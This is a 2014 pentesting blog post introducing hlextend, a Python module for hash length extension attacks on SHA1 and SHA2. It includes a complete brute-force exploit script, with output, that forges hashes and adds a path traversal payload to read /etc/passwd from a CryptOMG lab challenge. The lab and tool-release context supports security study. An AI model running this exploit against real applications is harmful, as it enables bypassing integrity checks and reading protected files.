---
layout: post
title: hlextend Pure Python hash length extension module
date: '2014-08-23T15:37:00.003+10:00'
author: Stephen Bradshaw
tags:
- pentesting
- cryptographic attack
- software
- cryptography
modified_time: '2014-08-23T16:53:19.380+10:00'
blogger_id: tag:blogger.com,1999:blog-2318886372568084567.post-6117180901078565719
blogger_orig_url: http://www.thegreycorner.com/2014/08/hlextend-pure-python-hash-length.html
redirect_from: /2014/08/hlextend-pure-python-hash-length.html
---

<h1>Introduction </h1><br/>Ive been spending some time recently looking at various types of cryptographic vulnerabilities, trying to work out more efficient ways of identifying and exploiting them during penetration tests.<br/><a href="http://en.wikipedia.org/wiki/Length_extension_attack" target="_blank"><br/></a><a href="http://en.wikipedia.org/wiki/Length_extension_attack" target="_blank">Hash length extension attacks</a> are one of the vulnerability classes I have been looking at, and while I'm aware of and have played round with other tools such as <a href="https://github.com/bwall/HashPump" target="_blank">Hashpump</a> and <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank">hash_extender</a>, I really wanted something that I could easily make use of in various Python scripts, as well as perhaps Python based Burp extensions.  To that end, I wrote my own pure Python module, hlextend.<br/><br/>In this initial version, hlextend only supports the vulnerable SHA1 and SHA2 hashes, sha1, sha256 and sha512.  I plan to add MD5 support in the next version. The module is based on the <a href="http://code.google.com/p/slowsha/" target="_blank">SlowSha</a> implementation by Stefano Palazzo, so it is slower than various compiled implementations, however it is fast enough for the uses I had in mind.<br/><br/>The module is available on <a href="https://github.com/stephenbradshaw/hlextend" target="_blank">GitHub</a>.<br/><br/><h1>Usage</h1><br/>Basic usage involves copying the module file hlextend.py into your Python path (or the present working directory when running a script that uses it), importing it, and using the 'new', 'extend' and 'hexdigest' functions to create an instance of your algorithm, use the extension functionality and printout the new hash.<br/><br/>For a more detailed example, assume an application you are attacking uses a known hash generated from an unknown secret value concatenated with a known user provided value to check the integrity of the user provided value - perhaps to ensure it has not been modified from an allowed set of values. You want to be able to produce a new valid hash after appending additional data to the known value, allowing you to change the data while still passing the integrity check function.<br/><br/>If the hash algorithm used is vulnerable, it is possible to achieve this without knowing the secret value as long as you know (or can guess, perhaps by brute force) the length of that secret value.  This is called a hash length extension attack.<br/><br/>Assume the application creates a sha1 hash value of '52e98441017043eee154a6d1af98c5e0efab055c', by concatenating an unknown secret of length 10 and known data of 'hello'.  You wish to append the text 'file' after 'hello' and also provide a valid hash back to the application that it will produce when it concatenates your provided value (which will include the string 'hello' followed by 'file') with its secret. You would do the following to perform the attack:<br/><pre>    stephen@stoat:~$ python<br/>    Python 2.7.3 (default, Feb 27 2014, 19:58:35)<br/>    [GCC 4.6.3] on linux2<br/>    Type "help", "copyright", "credits" or "license" for more information.<br/>    &gt;&gt;&gt; import hlextend<br/>    &gt;&gt;&gt; sha = hlextend.new('sha1')<br/>    &gt;&gt;&gt; print sha.extend('file', 'hello', 10, '52e98441017043eee154a6d1af98c5e0efab055c')<br/>    'hello\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br/>    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br/>    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xfile'<br/>    &gt;&gt;&gt; print sha.hexdigest()<br/>    c60fa7de0860d4048a3bfb36b70299a95e6587c9<br/></pre><br/> The unknown secret (of length 10), that when hashed appended with 'hello' produces a SHA1 hash of '52e98441017043eee154a6d1af98c5e0efab055c', will then produce a SHA1 hash of 'c60fa7de0860d4048a3bfb36b70299a95e6587c9' when appended with the output from the extend function above. <br/><br/>You may notice that the new value produced above contains a lot of additional data between the 'hello' and the 'file' - this is hex encoded padding data used by the hash algorithm that needs to be integrated into the hashed data in order for the attack to work - so strictly speaking you can't specify the EXACT value to append, only what comes after the padding, but under the right circumstances you can make the application ignore this extra padding. <br/><br/>If you don't know the exact length of the secret value, brute forcing the value by trying multiple different lengths can sometimes be possible, depending on the application.<br/><br/><h1>Example Attack</h1><br/>If you want a practical demonstration of the brute force approach, below is an example Python script that can exploit the <a href="https://github.com/SpiderLabs/CryptOMG" target="_blank">CryptOMG</a> hash length extension vulnerability in Challenge 5. For this challenge, the application is using a hash, sent with each file request, to confirm that the file being requested by the user is one that the user is allowed to access.  An example URL looks like the following:<br/><br/><pre>    http://192.168.56.101/CryptOMG/ctf/challenge5/index.php?algo=sha1&amp;file=hello&amp;hash=93e8aee4ec259392da7c273b05e29f4595c5b9c6</pre><br/>The hash value is generated by concatenating a secret value known to the application, with the filename that the user requests in the 'file' parameter (the filename is 'hello' in the above URL).  Including the secret value within the hash generation process prevents an attacker from easily changing the 'file' value, and then just generating a new valid hash to send to the application themselves.  The application, however, is vulnerable to a hash length extension attack, allowing the attacker to brute force a valid hash for a changed value of the file parameter, by trying multiple possible lengths for the initial secret (a fact unknown to the attacker).  This can be done WITHOUT ever having to know the actual secret itself.<br/><br/>The goal of Challenge 5 in CryptOMG is to read the /etc/passwd file, via bypassing the hash integrity check on the file parameter. This is what the script below will automate using the hlextend module to generate the extended hash values.<br/><br/>To use this script, install your own instance of CryptOMG and edit the 'site' parameter on line 11 to point to your instance of CryptOMG.  The values for hashAlg, startHash and fileName are all taken from the URL parameters of the application after changing the algorithm to 'sha1' and selecting the 'hello' file from the menu on the left, and shouldn't need to be changed.<br/><br/><style>.prettyprint ol.linenums > li { list-style-type: decimal; }</style> <br/><pre class="prettyprint">#!/usr/bin/env python<br/># Brute forcing script to solve CryptOMG Challenge 5 using hlextend Hash Length Extension Python module<br/>from urllib import quote<br/>import requests<br/>import socket<br/>import sys<br/>import time<br/>from HTMLParser import HTMLParser<br/>import hlextend<br/><br/>site ='http://192.168.56.101/CryptOMG/ctf/challenge5/index.php' <br/>hashAlg = 'sha1'<br/>startHash = '93e8aee4ec259392da7c273b05e29f4595c5b9c6'<br/>fileName = 'hello'<br/><br/>appendData = '../../../../../../../../../../../../../../etc/passwd'<br/>params = { 'algo' : hashAlg }<br/><br/>#cookies = { 'PHPSESSID' : '710jkfcq2t29us8u56ag5oii55' }<br/>#proxies = { 'http' : 'http://127.0.0.1:8080',  'https' : 'https://127.0.0.1:8080' } <br/><br/>try:<br/>    proxies<br/>except:<br/>    proxies = {}<br/><br/>try:<br/>    cookies<br/>except:<br/>    cookies = {}<br/><br/>reqsettings = { 'proxies' : proxies, 'stream' : False, 'timeout' : 5, 'verify' : False, 'cookies' : cookies }<br/><br/>class HParser(HTMLParser):<br/>    '''HTML parser to extract from div:content and h1 tags'''<br/><br/>    def __init__(self):<br/>        HTMLParser.__init__(self)<br/>        global inHtag<br/>        global inDtag<br/>        self.outData = ''<br/>        self.divData = ''<br/>        inHtag = False<br/>        inDtag = False<br/><br/><br/>    def handle_starttag(self, tag, attrs):<br/>        global inHtag<br/>        global inDtag<br/><br/>        if tag == 'h1':<br/>            inHtag = True<br/>        elif tag == 'div':<br/>            if (self.get_starttag_text().find('content') &gt; -1):<br/>                inDtag = True<br/>    <br/>    def handle_endtag(self, tag):<br/>        global inHtag<br/>        global inDtag<br/><br/>        if tag == "h1":<br/>            inHtag = False<br/>        elif tag == "div":<br/>            inDtag = False<br/><br/>    def handle_data(self, data):<br/>        global inHtag<br/>        global inDtag<br/><br/>        if inHtag:<br/>            self.outData = self.outData + data<br/>            #self.outData.append(data)<br/>        elif inDtag:<br/>            self.divData = self.divData + data<br/>            <br/><br/>    def close(self):<br/>        return [ self.outData, self.divData ]<br/><br/>sessions = requests.Session()<br/><br/>for length in xrange(3, 60):<br/>    sha = hlextend.new(hashAlg)<br/>    append = sha.extend(appendData, fileName, length, startHash, raw=True)<br/>    newHash = sha.hexdigest()<br/><br/>    params['file'] = append<br/>    params['hash'] = newHash<br/>    reqsettings['params'] = params<br/><br/>    while 1:<br/>        try:<br/>            response = sessions.get(site, **reqsettings)<br/>            break<br/>        except (socket.error, requests.exceptions.RequestException):<br/>            time.sleep(1)<br/>            continue<br/><br/>    parser = HParser()<br/>    parser.feed(response.text)<br/>    [ out, divdata ] = parser.close()<br/>    <br/>    noResult = False<br/>    <br/>    if out.find('File not found') &gt; -1:<br/>        noResult = True<br/><br/>    if not noResult:<br/>        print 'Length of secret: ' +  str(length)<br/>        print 'Parameter value for file: ' +  quote(append)<br/>        print 'Parameter value for hash: ' + newHash<br/>        print 'File contents: '<br/>        print divdata[6:]<br/>        sys.exit(0)<br/></pre><br/>Here is the output when I run the script on CryptOMG installed on a Metasploitable box:<br/><pre>    stephen@wolverine:~/code/hlextend-extra$ ./cryptomg5.py<br/>    Length of secret: 34<br/>    Parameter value for file: hello%80%018../../../../../../../../../../../../../../etc/passwd<br/>    Parameter value for hash: 1dcac9735aab91cd8c2433f5c55bed91ab167114<br/>    File contents:<br/>    root:x:0:0:root:/root:/bin/bash<br/>    daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br/>    bin:x:2:2:bin:/bin:/bin/sh<br/>    sys:x:3:3:sys:/dev:/bin/sh<br/>    sync:x:4:65534:sync:/bin:/bin/sync<br/>    games:x:5:60:games:/usr/games:/bin/sh<br/>    man:x:6:12:man:/var/cache/man:/bin/sh<br/>    lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br/>    mail:x:8:8:mail:/var/mail:/bin/sh<br/>    news:x:9:9:news:/var/spool/news:/bin/sh<br/>    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br/>    proxy:x:13:13:proxy:/bin:/bin/sh<br/>    www-data:x:33:33:www-data:/var/www:/bin/sh<br/>    backup:x:34:34:backup:/var/backups:/bin/sh<br/>    list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br/>    irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br/>    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br/>    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br/>    libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br/>    dhcp:x:101:102::/nonexistent:/bin/false<br/>    syslog:x:102:103::/home/syslog:/bin/false<br/>    klog:x:103:104::/home/klog:/bin/false<br/>    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin<br/>    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash<br/>    bind:x:105:113::/var/cache/bind:/bin/false<br/>    postfix:x:106:115::/var/spool/postfix:/bin/false<br/>    ftp:x:107:65534::/home/ftp:/bin/false<br/>    postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash<br/>    mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false<br/>    tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false<br/>    distccd:x:111:65534::/:/bin/false<br/>    user:x:1001:1001:just a user,111,,:/home/user:/bin/bash<br/>    service:x:1002:1002:,,,:/home/service:/bin/bash<br/>    telnetd:x:112:120::/nonexistent:/bin/false<br/>    proftpd:x:113:65534::/var/run/proftpd:/bin/false<br/>    statd:x:114:65534::/var/lib/nfs:/bin/false<br/>    vboxadd:x:115:1::/var/run/vboxadd:/bin/false<br/></pre><br/><h1>Get it!</h1><br/>You can download the module on GitHub <a href="https://github.com/stephenbradshaw/hlextend" target="_blank">here</a>. 